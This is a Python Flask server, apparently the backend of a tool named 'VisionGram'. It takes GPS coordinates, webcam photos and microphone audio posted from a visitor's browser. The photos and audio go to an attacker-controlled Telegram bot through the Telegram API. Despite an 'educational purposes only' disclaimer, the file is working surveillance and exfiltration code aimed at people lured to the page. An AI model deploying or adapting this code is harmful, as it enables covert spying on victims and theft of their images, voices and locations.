'''
       🌎 VisionGram 🌎

       ^ Author    : Cisamu
       ^ Name      : VisionGram
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
'''

from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

bot_token = "TELEGRAM_TOKEN_HERE"
chat_id = "TELEGRAM_CHAT_ID_HERE"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    full_location = f'Latitude: {latitude}, Longitude: {longitude}'
    google_maps_url = f'https://www.google.com/maps?q={latitude},{longitude}'

    return jsonify({'message': 'Location received successfully', 'full_location': full_location, 'google_maps_url': google_maps_url})

@app.route('/send_photo', methods=['POST'])
def send_photo():
    photo = request.files['photo']
    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
    files = {'photo': ('webcam_photo.png', photo)}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)

    return jsonify({'message': 'Photo sent successfully'})

@app.route('/send_audio', methods=['POST'])
def send_audio():
    audio = request.files['audio']
    url = f'https://api.telegram.org/bot{bot_token}/sendVoice'
    files = {'voice': ('audio.wav', audio)}
    data = {'chat_id': chat_id}
    response = requests.post(url, files=files, data=data)

    return jsonify({'message': 'Audio sent successfully'})

if __name__ == '__main__':
    app.run()
